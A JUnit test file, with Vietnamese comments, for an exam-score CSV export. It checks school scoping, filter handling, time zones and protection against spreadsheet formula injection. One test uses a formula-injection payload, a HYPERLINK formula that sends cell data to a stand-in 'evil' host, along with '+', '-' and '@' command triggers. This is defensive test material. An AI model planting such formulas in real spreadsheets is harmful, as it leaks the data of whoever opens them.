package com.sep.vox.application.usecase.examgrading;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import java.math.BigDecimal;
import java.time.Instant;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.UUID;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import com.sep.vox.application.port.input.query.ExportExamScoresQuery;
import com.sep.vox.application.port.input.service.ExamGradingAccessService;
import com.sep.vox.application.port.input.service.ExamScoreExportSupport;
import com.sep.vox.application.port.input.usecase.examgrading.ExportExamScoresUseCase;
import com.sep.vox.application.query.dto.ExamScoreRowInfo;
import com.sep.vox.application.query.dto.GradingAssignmentFilter;
import com.sep.vox.application.query.repository.ExamGradingQueryRepository;

/**
 * File này được mở bằng Excel bởi school admin — tài khoản quyền cao nhất trong trường
 * — nên ô do người dùng nhập không được phép trở thành công thức (review BE-9), và một
 * lần bấm nhầm không được kéo cả trường ra RAM (review BE-10).
 *
 * <p>Dùng {@link ExamScoreExportSupport} THẬT thay vì mock nó: phân quyền và guard phạm vi
 * đã dời sang đó, mock đi thì hai bảo đảm trên không còn được test nào canh.
 */
class ExportExamScoresUseCaseTests {

    private ExamGradingQueryRepository examGradingQueryRepository;
    private ExamGradingAccessService examGradingAccessService;
    private ExportExamScoresUseCase useCase;

    private final UUID adminId = UUID.randomUUID();
    private final UUID schoolId = UUID.randomUUID();
    private final UUID examId = UUID.randomUUID();

    @BeforeEach
    void setUp() {
        examGradingQueryRepository = mock(ExamGradingQueryRepository.class);
        examGradingAccessService = mock(ExamGradingAccessService.class);
        useCase = new ExportExamScoresUseCase(
            new ExamScoreExportSupport(examGradingQueryRepository, examGradingAccessService));

        when(examGradingAccessService.requireActiveUserId()).thenReturn(adminId);
        when(examGradingAccessService.requireCurrentSchoolId(adminId)).thenReturn(schoolId);
        when(examGradingQueryRepository.findScoreRows(any())).thenReturn(List.of());
    }

    private void givenRow(String studentName, Instant releasedAt) {
        when(examGradingQueryRepository.findScoreRows(any())).thenReturn(List.of(
            new ExamScoreRowInfo(UUID.randomUUID(), studentName, "hs@example.com", "12A1",
                "IELTS Mock", OffsetDateTime.parse("2026-07-12T08:00:00+07:00").toInstant(),
                new BigDecimal("7.50"), "B2", "RELEASED",
                "INITIAL", "UPHELD", "Cô Lan", releasedAt)));
    }

    private void givenRowWithStudentName(String studentName) {
        givenRow(studentName, null);
    }

    private String export() {
        return useCase.execute(ExportExamScoresQuery.scopedTo(examId, null, null));
    }

    private GradingAssignmentFilter capturedFilter() {
        var captor = ArgumentCaptor.forClass(GradingAssignmentFilter.class);
        verify(examGradingQueryRepository).findScoreRows(captor.capture());
        return captor.getValue();
    }

    @Test
    void should_require_an_exam_or_a_schedule_scope() {
        assertThatThrownBy(() -> useCase.execute(ExportExamScoresQuery.scopedTo(null, null, null)))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("kỳ thi hoặc ca thi");

        verify(examGradingQueryRepository, never()).findScoreRows(any());
    }

    @Test
    void should_accept_a_schedule_only_scope() {
        var scheduleId = UUID.randomUUID();

        useCase.execute(ExportExamScoresQuery.scopedTo(null, scheduleId, null));

        var filter = capturedFilter();
        assertThat(filter.schoolId()).isEqualTo(schoolId);
        assertThat(filter.examId()).isNull();
        assertThat(filter.scheduleId()).isEqualTo(scheduleId);
    }

    /** Trường lấy từ phiên đăng nhập, không phải từ query — chốt chặn chống xuất chéo trường. */
    @Test
    void should_scope_the_filter_to_the_school_of_the_caller() {
        export();

        assertThat(capturedFilter().schoolId()).isEqualTo(schoolId);
    }

    /**
     * Bỏ trống loại bài KHÔNG được hiểu là "cả hai": câu xuất bảng điểm bản trước không
     * lọc kind, nên xuất từ màn bài trên lớp kéo theo cả điểm kỳ thi tập trung.
     */
    @Test
    void should_default_the_exam_kind_to_centralized() {
        export();

        assertThat(capturedFilter().examKind()).isEqualTo("CENTRALIZED");
    }

    @Test
    void should_pass_the_class_test_kind_through() {
        useCase.execute(ExportExamScoresQuery.scopedTo(examId, null, "CLASS_TEST"));

        assertThat(capturedFilter().examKind()).isEqualTo("CLASS_TEST");
    }

    @Test
    void should_pass_the_screen_filters_through() {
        var teacherId = UUID.randomUUID();

        useCase.execute(new ExportExamScoresQuery(examId, null, teacherId, "RELEASED", "APPEAL",
            "COMPLETED", true, true, Boolean.TRUE, "  nguyen  ", "CLASS_TEST"));

        var filter = capturedFilter();
        assertThat(filter.teacherId()).isEqualTo(teacherId);
        assertThat(filter.resultStatus()).isEqualTo("RELEASED");
        assertThat(filter.roundType()).isEqualTo("APPEAL");
        assertThat(filter.assignmentStatus()).isEqualTo("COMPLETED");
        assertThat(filter.unassignedOnly()).isTrue();
        assertThat(filter.overdueOnly()).isTrue();
        assertThat(filter.hasOpenAppeal()).isTrue();
        assertThat(filter.keyword()).isEqualTo("nguyen");
    }

    /** Chuỗi rỗng từ query string là "không lọc"; để nguyên thì `cr.status = ''` ra file trống. */
    @Test
    void should_treat_a_blank_filter_as_no_filter() {
        useCase.execute(new ExportExamScoresQuery(examId, null, null, "", "  ", "",
            false, false, null, "   ", null));

        var filter = capturedFilter();
        assertThat(filter.resultStatus()).isNull();
        assertThat(filter.roundType()).isNull();
        assertThat(filter.assignmentStatus()).isNull();
        assertThat(filter.keyword()).isNull();
    }

    @Test
    void should_neutralize_a_cell_that_starts_like_a_formula() {
        givenRowWithStudentName("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")");

        // Dấu nháy đơn phía trước là thứ ngăn Excel CHẠY ô này lúc mở file.
        assertThat(export()).contains("\"'=HYPERLINK(");
    }

    @Test
    void should_neutralize_the_other_formula_triggers_too() {
        for (var trigger : List.of("+", "-", "@")) {
            givenRowWithStudentName(trigger + "cmd");

            assertThat(export()).contains("\"'" + trigger + "cmd\"");
        }
    }

    @Test
    void should_leave_an_ordinary_name_untouched() {
        givenRowWithStudentName("Nguyễn Văn A");

        assertThat(export()).contains("\"Nguyễn Văn A\"").doesNotContain("'Nguyễn");
    }

    @Test
    void should_still_escape_quotes_inside_a_cell() {
        givenRowWithStudentName("Trần \"Bo\" Nam");

        assertThat(export()).contains("\"Trần \"\"Bo\"\" Nam\"");
    }

    @Test
    void should_print_the_sitting_time_in_vietnam_time() {
        givenRowWithStudentName("Nguyễn Văn A");

        // Nguồn là 08:00+07:00; in ra phải là 08:00 bất kể JVM chạy ở múi giờ nào.
        assertThat(export()).contains("\"08:00 12/07/2026\"");
    }

    @Test
    void should_print_the_release_time_in_vietnam_time_too() {
        givenRow("Nguyễn Văn A", OffsetDateTime.parse("2026-07-20T03:30:00Z").toInstant());

        // Cùng một file, cùng một người đọc: "Thời điểm công bố" không được là ISO thô
        // giờ UTC trong khi "Ca thi" đã là giờ VN.
        assertThat(export()).contains("\"10:30 20/07/2026\"").doesNotContain("2026-07-20T03:30");
    }

    @Test
    void should_end_every_line_with_crlf() {
        givenRowWithStudentName("Nguyễn Văn A");

        assertThat(export().lines()).hasSize(2);
        assertThat(export()).contains("\r\n").doesNotContain("\n\n");
    }
}
